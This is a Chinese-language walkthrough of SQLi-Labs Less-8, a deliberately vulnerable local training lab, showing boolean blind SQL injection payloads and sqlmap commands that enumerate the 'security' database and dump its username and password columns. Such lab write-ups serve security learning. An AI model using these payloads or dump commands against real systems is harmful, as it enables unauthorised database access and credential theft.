# SQLi-Labs Less-8 布尔盲注复现及自动化脚本建议

### 🛠️ SQLi-Labs Less-8 布尔盲注复现指南

Less-8 是典型的**单引号闭合字符型布尔盲注**，页面仅通过“有回显/无回显”两种状态反馈SQL条件的真假，我们可以通过构造条件判断来逐步窃取数据，也可以用 sqlmap 自动化完成注入。

---

#### 🔍 步骤1：判断注入点与注入类型

1. **测试条件真**：

    ```Plain Text
    
    http://127.0.0.1/sqli-labs/Less-8/?id=1' and 1=1--+
    ```

    页面显示 `Welcome Dhakkan`，说明条件为真时回显。

2. **测试条件假**：

    ```Plain Text
    
    http://127.0.0.1/sqli-labs/Less-8/?id=1' and 1=2--+
    ```

    页面无回显，确认是布尔盲注，注入点为 `id` 参数，闭合方式为单引号 `'`。

---

#### 🧰 步骤2：手工布尔盲注（原理演示）

我们通过逐位猜解的方式获取数据库名，核心是利用 `length()`、`mid()`、`ascii()` 函数构造条件。

1. **猜数据库名长度**：

    ```Plain Text
    
    http://127.0.0.1/sqli-labs/Less-8/?id=1' and length(database())=8--+
    ```

    有回显，说明数据库名长度为 **8**。

2. **逐位猜解数据库名字符**：

以猜解第1位为例：

```Plain Text

http://127.0.0.1/sqli-labs/Less-8/?id=1' and ascii(mid(database(),1,1))=115--+
```

115 对应 ASCII 字符 `s`，有回显，说明数据库名第1位是 `s`。

重复此过程，可得到完整数据库名 `security`（长度8，符合）。

注：手工盲注效率极低，实际渗透中通常使用脚本或工具自动化。

---

#### ⚡ 步骤3：sqlmap 自动化注入（推荐）

sqlmap 可以自动识别布尔盲注并完成数据提取，以下是核心命令：

1. **获取所有数据库名**：

    ```Bash
    
    sqlmap -u "http://127.0.0.1/sqli-labs/Less-8/?id=1" --batch --dbs
    ```

    - `--batch`：自动选择默认选项，无需交互。

    - `--dbs`：枚举所有数据库名。

    执行后会得到 `security`、`user` 等数据库列表。

2. **获取指定数据库下的表**（以 `security` 为例）：

    ```Bash
    
    sqlmap -u "http://127.0.0.1/sqli-labs/Less-8/?id=1" --batch -D security --tables
    ```

    会列出 `security` 库下的表，如 `users`、`emails` 等。

3. **获取指定表下的列**（以 `users` 表为例）：

    ```Bash
    
    sqlmap -u "http://127.0.0.1/sqli-labs/Less-8/?id=1" --batch -D security -T users --columns
    ```

    会列出 `users` 表的列，如 `id`、`username`、`password`。

4. **提取表中数据**：

    ```Bash
    
    sqlmap -u "http://127.0.0.1/sqli-labs/Less-8/?id=1" --batch -D security -T users -C username,password --dump
    ```

    会自动提取 `username` 和 `password` 字段的所有数据。

---

### ✅ 复现总结

- **核心原理**：利用页面回显差异，通过SQL条件判断逐位窃取数据。

- **手工注入**：适合理解原理，效率低，仅用于演示。

- **sqlmap 注入**：自动化高效，是实际渗透的首选工具，命令清晰可直接复制执行。

---
> （注：文档部分内容可能由 AI 生成）